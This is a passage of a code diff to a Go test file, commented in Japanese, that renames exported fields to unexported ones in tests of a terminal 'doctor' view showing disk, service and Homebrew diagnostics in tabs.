 	v.HandleKey("h", 20) // タブが動くだけ
-	if !v.Expanded[parent] {
+	if !v.expanded[parent] {
 		t.Error("h で畳まれた (h はタブ移動のはず)")
 	}
 	v.HandleKey("l", 20) // 戻る
-	if v.Tab != TabDisk {
-		t.Fatalf("タブが戻らない: %v", v.Tab)
+	if v.tab != TabDisk {
+		t.Fatalf("タブが戻らない: %v", v.tab)
 	}
-	v.Cur.JumpTo(v.Rows, parent)
+	v.cur.jumpTo(v.rows, parent)
 	v.HandleKey("enter", 20)
-	if v.Expanded[parent] {
+	if v.expanded[parent] {
 		t.Error("もう一度 Enter で畳まれない")
 	}
 
@@ -2009,55 +2009,55 @@ func TestDoctorCelebratesOnlyWhenTrulyClean(t *testing.T) {
 	o := DoctorRenderOpts{Width: 96, Page: 30, Colored: false, Spinner: "⠋", Now: time.Now()}
 	render := func(v *DoctorView) string {
 		var b strings.Builder
-		for t := DoctorTab(0); t < NumDoctorTabs; t++ {
-			v.Tab = t
+		for t := DoctorTab(0); t < numDoctorTabs; t++ {
+			v.tab = t
 			b.WriteString(strings.Join(v.Lines(o), "\n") + "\n")
 		}
 		return b.String()
 	}
 
 	t.Run("両方きれいなら祝う", func(t *testing.T) {
-		v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-		v.SvcRep, v.Brew = &svc.Report{}, &BrewDoctorResult{Clean: true}
+		v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+		v.svcRep, v.brew = &svc.Report{}, &brewDoctorResult{Clean: true}
 		out := render(v)
 		if strings.Count(out, "🎉") != 2 {
 			t.Errorf("サービスと Homebrew の両方で祝っていない:\n%s", out)
 		}
 	})
 	t.Run("壊れた登録があれば祝わない", func(t *testing.T) {
-		v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-		v.SvcRep = &svc.Report{Findings: []svc.Finding{{Label: "com.x.y", PlistPath: "/L/com.x.y.plist", Domain: "gui/501"}}}
-		v.Brew = &BrewDoctorResult{Clean: true}
+		v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+		v.svcRep = &svc.Report{Findings: []svc.Finding{{Label: "com.x.y", PlistPath: "/L/com.x.y.plist", Domain: "gui/501"}}}
+		v.brew = &brewDoctorResult{Clean: true}
 		out := render(v)
 		if strings.Count(out, "🎉") != 1 {
 			t.Errorf("壊れた登録があるのにサービス側で祝った:\n%s", out)
 		}
 	})
-	// 🚨 この 2 つは **ParseBrewDoctor を通して**状態を作る。リテラルで
-	// BrewDoctorResult{Unavailable: ...} を組むと、描画側の case の順序だけを見ることになり
+	// 🚨 この 2 つは **parseBrewDoctor を通して**状態を作る。リテラルで
+	// brewDoctorResult{Unavailable: ...} を組むと、描画側の case の順序だけを見ることになり
 	// 「そもそもその状態を作れるか」を検査しない = 局所の変異では壊せないテストになる
 	// (変異検証で実際に素通りした)
 	t.Run("診断できずなら祝わない", func(t *testing.T) {
-		v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-		v.SvcRep = &svc.Report{}
-		b := ParseBrewDoctor("", "Error: brew is broken\n", 1) // 非 0 なのに警告なし = 診断できず
+		v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+		v.svcRep = &svc.Report{}
+		b := parseBrewDoctor("", "Error: brew is broken\n", 1) // 非 0 なのに警告なし = 診断できず
 		if b.Unavailable == "" {
 			t.Fatalf("前提が崩れている: 診断できずになっていない: %+v", b)
 		}
-		v.Brew = &b
+		v.brew = &b
 		// 🚨 Homebrew の行に限って見る。全体を見るとサービス側の 🎉 を拾う
 		if out := render(v); strings.Contains(out, "🎉 Your system is ready") {
 			t.Errorf("診断できていないのに Homebrew で祝った:\n%s", out)
 		}
 	})
 	t.Run("警告があれば祝わない", func(t *testing.T) {
-		v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-		v.SvcRep = &svc.Report{}
-		b := ParseBrewDoctor("", brewWarnDeprecated+"\n", 1)
+		v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+		v.svcRep = &svc.Report{}
+		b := parseBrewDoctor("", brewWarnDeprecated+"\n", 1)
 		if len(b.Warnings) == 0 {
 			t.Fatalf("前提が崩れている: 警告が解析できていない: %+v", b)
 		}
-		v.Brew = &b
+		v.brew = &b
 		if out := render(v); strings.Contains(out, "🎉 Your system is ready") {
 			t.Errorf("警告があるのに Homebrew で祝った:\n%s", out)
 		}
@@ -2071,13 +2071,13 @@ func TestDoctorCelebratesOnlyWhenTrulyClean(t *testing.T) {
 // どこに何件あるかが分かる (出ないと異常の有無を知るために全タブを回ることになる)。
 func TestDoctorTabs(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
+	runCmds(t, v, v.open())
 	o := testOpts(20)
 
 	t.Run("一望性: どのタブでも 3 つとも件数が出る", func(t *testing.T) {
 		for _, tb := range []DoctorTab{TabDisk, TabSvc, TabBrew} {
-			v.Tab = tb
-			bar := v.TabBarLine(o)
+			v.tab = tb
+			bar := v.tabBarLine(o)
 			for _, want := range []string{"ディスク", "サービス", "Homebrew"} {
 				if !strings.Contains(bar, want) {
 					t.Errorf("tab=%d のタブ行に %q が無い: %q", tb, want, bar)
@@ -2090,12 +2090,12 @@ func TestDoctorTabs(t *testing.T) {
 	})
 
 	t.Run("表示中のタブの節だけ描く", func(t *testing.T) {
-		v.Tab = TabDisk
+		v.tab = TabDisk
 		out := testText(v, 20)
 		if !strings.Contains(out, "▌ディスク占有") || strings.Contains(out, "▌Homebrew") {
 			t.Errorf("ディスクのタブに他の節が出ている:\n%s", out)
 		}
-		v.Tab = TabBrew
+		v.tab = TabBrew
 		out = testText(v, 20)
 		if !strings.Contains(out, "▌Homebrew") || strings.Contains(out, "▌ディスク占有") {
 			t.Errorf("Homebrew のタブに他の節が出ている:\n%s", out)
@@ -2103,17 +2103,17 @@ func TestDoctorTabs(t *testing.T) {
 	})
 
 	t.Run("tab で送り shift+tab で戻る (端で回る)", func(t *testing.T) {
-		v.Tab = TabDisk
+		v.tab = TabDisk
 		for _, want := range []DoctorTab{TabSvc, TabBrew, TabDocker, TabSSD, TabDisk} {
 			v.HandleKey("tab", 20)
-			if v.Tab != want {
-				t.Fatalf("tab で %v へ行かない: %v", want, v.Tab)
+			if v.tab != want {
+				t.Fatalf("tab で %v へ行かない: %v", want, v.tab)
 			}
 		}
 		for _, want := range []DoctorTab{TabSSD, TabDocker, TabBrew, TabSvc, TabDisk} {
 			v.HandleKey("shift+tab", 20)
-			if v.Tab != want {
-				t.Fatalf("shift+tab で %v へ戻らない: %v", want, v.Tab)
+			if v.tab != want {
+				t.Fatalf("shift+tab で %v へ戻らない: %v", want, v.tab)
 			}
 		}
 	})
@@ -2126,11 +2126,11 @@ func TestDoctorTabs(t *testing.T) {
 		// タブごとに覚えていなくても cur がそのまま残って restore が同じ行を引き当てるので、
 		// 「覚えている」と「持ち越しているだけ」を区別できない (変異で実際に素通りした)。
 		// 切り替えは handleKey だけで行う (v.tab を直接触ると moveTab の保存を飛ばす)
-		v.Tab = TabDisk
+		v.tab = TabDisk
 		_ = v.Lines(o)
 		v.HandleKey("enter", 20) // ディスクの行を開いて中の対象パスへ移る
 		_ = v.Lines(o)
-		diskKey := v.Cur.Key
+		diskKey := v.cur.key
 		if !strings.HasPrefix(string(diskKey), "diskitem:") {
 			t.Fatalf("前提が崩れている: ディスクのカーソルが対象パスに無い: %q", diskKey)
 		}
@@ -2139,13 +2139,13 @@ func TestDoctorTabs(t *testing.T) {
 		v.HandleKey("tab", 20) // → Docker
 		v.HandleKey("tab", 20) // → SSD
 		_ = v.Lines(o)
-		if v.Cur.Key == diskKey {
+		if v.cur.key == diskKey {
 			t.Fatalf("前提が崩れている: SSD でディスクの行を指している: %q", diskKey)
 		}
 		v.HandleKey("tab", 20) // → ディスクへ一周
 		_ = v.Lines(o)
-		if v.Cur.Key != diskKey {
-			t.Errorf("ディスクのカーソルが戻らない: %q (期待 %q)", v.Cur.Key, diskKey)
+		if v.cur.key != diskKey {
+			t.Errorf("ディスクのカーソルが戻らない: %q (期待 %q)", v.cur.key, diskKey)
 		}
 	})
 }
@@ -2155,13 +2155,13 @@ func TestDoctorTabs(t *testing.T) {
 // 畳むものが無いときだけ doctor を閉じ、D / esc は無条件に閉じる。
 func TestDoctorQCollapsesBeforeClosing(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
-	v.Tab = TabDisk
+	runCmds(t, v, v.open())
+	v.tab = TabDisk
 	_ = v.Lines(testOpts(20))
 
-	parent := v.Rows[v.Cur.Index].Key
+	parent := v.rows[v.cur.index].key
 	v.HandleKey("enter", 20)
-	if !v.Expanded[parent] {
+	if !v.expanded[parent] {
 		t.Fatal("Enter で開かない")
 	}
 
@@ -2169,29 +2169,29 @@ func TestDoctorQCollapsesBeforeClosing(t *testing.T) {
 	if act := v.HandleKey("q", 20); act == DoctorClosed {
 		t.Error("開いている行の q で doctor ごと閉じた")
 	}
-	if v.Expanded[parent] {
+	if v.expanded[parent] {
 		t.Error("q で畳まれない")
 	}
-	if !v.Shown {
+	if !v.shown {
 		t.Error("q で画面が閉じた (畳むだけのはず)")
 	}
 
 	// (2) 中の対象パスの行に居るときの q → 親を畳んでカーソルを親へ戻す
 	v.HandleKey("enter", 20)
 	_ = v.Lines(testOpts(20))
-	v.JumpIntoDetail()
+	v.jumpIntoDetail()
 	_ = v.Lines(testOpts(20))
-	if got := v.Rows[v.Cur.Index].Key; !strings.HasPrefix(string(got), "diskitem:") {
+	if got := v.rows[v.cur.index].key; !strings.HasPrefix(string(got), "diskitem:") {
 		t.Fatalf("対象パスの行へ入れていない: %q", got)
 	}
 	if act := v.HandleKey("q", 20); act == DoctorClosed {
 		t.Error("対象パスの行の q で doctor ごと閉じた")
 	}
-	if v.Expanded[parent] {
+	if v.expanded[parent] {
 		t.Error("対象パスの行の q で親が畳まれない")
 	}
-	if v.Cur.Key != parent {
-		t.Errorf("カーソルが親へ戻らない: %q; want %q", v.Cur.Key, parent)
+	if v.cur.key != parent {
+		t.Errorf("カーソルが親へ戻らない: %q; want %q", v.cur.key, parent)
 	}
 
 	// (3) 畳むものが無ければ q は閉じる (抜ける手段が消えていないこと)
@@ -2199,7 +2199,7 @@ func TestDoctorQCollapsesBeforeClosing(t *testing.T) {
 	if act := v.HandleKey("q", 20); act != DoctorClosed {
 		t.Errorf("何も開いていないときの q が閉じない: %v", act)
 	}
-	if v.Shown {
+	if v.shown {
 		t.Error("q で閉じていない")
 	}
 }
@@ -2208,8 +2208,8 @@ func TestDoctorQCollapsesBeforeClosing(t *testing.T) {
 // D / esc はどちらの状態でも案内に残る = 一発で抜ける手段が消えない。
 func TestDoctorCloseHintDropsQWhileCollapsible(t *testing.T) {
 	v := testView(t)
-	runCmds(t, v, v.Open())
-	v.Tab = TabDisk
+	runCmds(t, v, v.open())
+	v.tab = TabDisk
 	_ = v.Lines(testOpts(20))
 
 	if h := v.Hint(200); !strings.Contains(h, "D/q/esc: 閉じる") {
@@ -2230,15 +2230,15 @@ func TestDoctorCloseHintDropsQWhileCollapsible(t *testing.T) {
 func TestDoctorEscClosesEvenWhenExpanded(t *testing.T) {
 	for _, key := range []string{"D", "esc"} {
 		v := testView(t)
-		runCmds(t, v, v.Open())
-		v.Tab = TabDisk
+		runCmds(t, v, v.open())
+		v.tab = TabDisk
 		_ = v.Lines(testOpts(20))
 		v.HandleKey("enter", 20)
 		_ = v.Lines(testOpts(20))
 		if act := v.HandleKey(key, 20); act != DoctorClosed {
 			t.Errorf("%s が開いている状態で閉じない: %v", key, act)
 		}
-		if v.Shown {
+		if v.shown {
 			t.Errorf("%s で閉じていない", key)
 		}
 	}
@@ -2253,42 +2253,42 @@ func TestDoctorEscClosesEvenWhenExpanded(t *testing.T) {
 // 🚨 判定は「展開できるか (hasDetail)」と「detail が実際に組まれているか」を**別々に**見る。
 // len(detail) だけで展開可否を決める形へ戻すと、畳まれた行が展開できなくなる。
 func TestDoctorCollapsedRowsDoNotBuildDetail(t *testing.T) {
-	v := &DoctorView{Shown: true, Expanded: map[RowKey]bool{}}
-	v.DiskRep = &disk.Report{Results: []disk.Result{{
+	v := &DoctorView{shown: true, expanded: map[rowKey]bool{}}
+	v.diskRep = &disk.Report{Results: []disk.Result{{
 		Entry:  disk.Entry{ID: "e0", Label: "E0", Risk: disk.RiskSafe, Recover: "r", DeleteVia: "rm"},
 		Status: disk.StatusOK, Size: 3,
 		Items: []disk.Item{{Path: "/p/a", Size: 1}, {Path: "/p/b", Size: 1}, {Path: "/p/c", Size: 1}},
 	}}}
-	v.SvcRep = &svc.Report{}
-	v.Brew = &BrewDoctorResult{Clean: true}
+	v.svcRep = &svc.Report{}
+	v.brew = &brewDoctorResult{Clean: true}
 	o := testOpts(40)
 
-	rows := v.BuildRows(o)
-	var target *DoctorRow
+	rows := v.buildRows(o)
+	var target *doctorRow
 	for i := range rows {
-		if rows[i].Key == "disk:e0" {
+		if rows[i].key == "disk:e0" {
 			target = &rows[i]
 		}
 	}
 	if target == nil {
 		t.Fatal("対象の行が見つからない (fixture が届いていない)")
 	}
-	if !target.HasDetail {
+	if !target.hasDetail {
 		t.Error("畳まれていても「展開できる」は真であるべき (hasDetail)")
 	}
-	if len(target.Detail) != 0 {
-		t.Errorf("畳まれているのに detail を %d 行組んでいる (作って捨てている)", len(target.Detail))
+	if len(target.detail) != 0 {
+		t.Errorf("畳まれているのに detail を %d 行組んでいる (作って捨てている)", len(target.detail))
 	}
 
 	// 陽性対照: 展開したら組む (上の assert が「常に空」ではないことの担保)
-	v.Expanded["disk:e0"] = true
-	rows = v.BuildRows(o)
+	v.expanded["disk:e0"] = true
+	rows = v.buildRows(o)
 	for i := range rows {
-		if rows[i].Key == "disk:e0" {
+		if rows[i].key == "disk:e0" {
 			target = &rows[i]
 		}
 	}
-	if len(target.Detail) == 0 {
+	if len(target.detail) == 0 {
 		t.Error("展開しているのに detail が空 (遅延が効きすぎている)")
 	}
 }
